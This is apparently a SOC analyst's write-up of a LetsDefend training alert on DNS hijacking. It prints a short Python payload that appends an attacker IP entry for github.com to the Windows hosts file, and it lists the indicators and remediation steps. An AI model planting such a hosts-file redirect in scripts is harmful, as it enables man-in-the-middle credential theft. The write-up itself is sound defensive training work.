# SOC116 - DNS Hijacking Detected (Event ID:49)

## Executive Summary

On February 6, 2021, the Security Operations Center (SOC) received an alert for a potential DNS Hijacking attack on the host **WilsonPRD** (172.16.17.34). The investigation confirmed that a Python script, `update.py`, was executed, maliciously modifying the system's **hosts file** to redirect `github.com` traffic to an attacker-controlled IP (`49.233.160.217`). Subsequent network logs provided definitive proof that the hijack was successful, showing the compromised host connecting to the attacker's server while believing it was communicating with the legitimate `github.com`. The `Device Action: Allowed` for the script's execution and the resulting C2 traffic confirm a full host compromise and an active Man-in-the-Middle (MITM) attack. This is a **True Positive** critical incident.

## Incident Details

The initial alert was triggered by the execution of a script with behaviors associated with DNS hijacking:

<img width="1357" height="567" alt="image" src="https://github.com/user-attachments/assets/f2b853b7-614a-4920-a3b6-89afa5463c4a" />

| | |
| :--- | :--- |
| **Date of Incident**| February 6, 2021 |
| **Source Host**| WilsonPRD (172.16.17.34) |
| **Malicious File**| update.py |
| **File Hash (MD5)**| 307b47d1217f267a47cee8dd86c2f191 |
| **Attacker C2 IP**| 49.233.160.217 |
| **Hijacked Domain**| `github.com` |
| **Attack Type**| DNS Hijacking / Man-in-the-Middle (MITM) |
| **Case Link**| *([Case link](https://app.letsdefend.io/case-management/casedetail/sohankanna/49))* |

## Investigation and Analysis

### 1. Alert Context: DNS Hijacking via the Hosts File

The rule `SOC116 - DNS Hijacking Detected` is designed to detect a critical redirection technique (MITRE ATT&CK T1565.001). The `hosts` file on a Windows system is a local DNS lookup file that overrides public DNS. By adding an entry like `49.233.160.217 github.com`, an attacker forces the victim's machine to connect to *their* malicious server instead of the real one. This is a classic Man-in-the-Middle (MITM) attack used to serve fake login pages for credential theft or to deliver malware.

### 2. Malware Analysis (Deceptive Script)

The investigation focused on the `update.py` script. While VirusTotal returned zero detections due to the script's simplicity, a static code analysis revealed its malicious payload hidden within benign-looking code.

```python
# [Benign code with progress bars...]

# --- MALICIOUS PAYLOAD ---
f = open("C:\Windows\System32\drivers\etc\hosts", "a")
f.write("49.233.160.217 github.com")
f.close()
```
This final block of code is the entire attack. It appends a line to the `hosts` file, causing all subsequent traffic for `github.com` from this machine to be redirected to the attacker's IP.

### 3. Confirmation of Success: The Hijack and C2 Connection

The investigation confirmed a full compromise through a two-step analysis:

**1. Successful Execution:** The SIEM alert's **`Device Action: Allowed`** status confirms that endpoint security did not stop the `update.py` script from running. Therefore, the `hosts` file was successfully modified.

**2. Successful C2 Connection (The "Smoking Gun"):** Network logs from shortly after the script's execution show the compromised host attempting to connect to `https://github.com`.

<img width="1264" height="315" alt="Screenshot 2025-10-15 140038" src="https://github.com/user-attachments/assets/68fbfc59-a8c7-4ce8-bff2-114089252ee3" />

While the URL in this log appears benign, the malicious `hosts` file entry means this traffic was **not sent to the legitimate GitHub servers**. Instead, it was redirected to the attacker's C2 server. This log is definitive proof that the DNS hijack was successful and that the victim's machine established a connection with the attacker's infrastructure under the guise of a legitimate site.

## Skills and Tools Utilized

*   **Tools Used:** SIEM, EDR, Network Logs, VirusTotal, Static Analysis
*   **Skills Demonstrated:** Triage, Static Code Analysis (Python), DNS Hijacking / MITM Analysis, TTP Recognition, Attack Chain Correlation.

## Playbook Solution: Incident Classification

*   **Is Traffic Malicious?** **Yes.** The script's action and the resulting C2 connection are malicious.
*   **What Is The Attack Type?** **DNS Hijacking** leading to **C2 Communication.**
*   **Was the Attack Successful?** **Yes.** The script ran, the hosts file was modified, and the host connected to the attacker's C2 server.
*   **Do You Need Tier 2 Escalation?** **Yes.** A successful MITM attack and C2 connection is a critical incident.
*   **Incident Classification:** **True Positive.**

## Conclusion and Recommendations

The alert for SOC116 was a **true positive**. An attacker successfully executed a script on the host **WilsonPRD** that hijacked its DNS resolution for `github.com`, leading to a successful connection with an attacker-controlled server. The host is compromised, and all communications to `github.com` from this host must be considered intercepted.

**Recommendations:**

1.  **CONTAINMENT - Isolate Host Immediately:** Disconnect the host **WilsonPRD** (172.16.17.34) from the network to sever any active C2 connection and prevent the user from sending credentials to the malicious site.
2.  **ERADICATION - Remediate the Hosts File:** An administrator must edit the `C:\Windows\System32\drivers\etc\hosts` file on the compromised machine and remove the malicious line (`49.233.160.217 github.com`).
3.  **CREDENTIALS - Assume Compromise:** The user's GitHub credentials must be considered stolen. The password for the user's GitHub account must be reset immediately, and any access tokens or SSH keys associated with it should be revoked.
4.  **ESCALATE:** Escalate this incident to the Tier 2/Incident Response (IR) team.
5.  **INVESTIGATION:**
    *   The IR team must determine the initial access vector for `update.py`.
    *   They should analyze any available traffic captures from the C2 connection to understand what data was exchanged.
6.  **BLOCK INDICATORS:** Block the attacker's IP address `49.233.160.217` at the network firewall. Add the hash of `update.py` (`307b47d1217f267a47cee8dd86c2f191`) to the EDR blocklist.





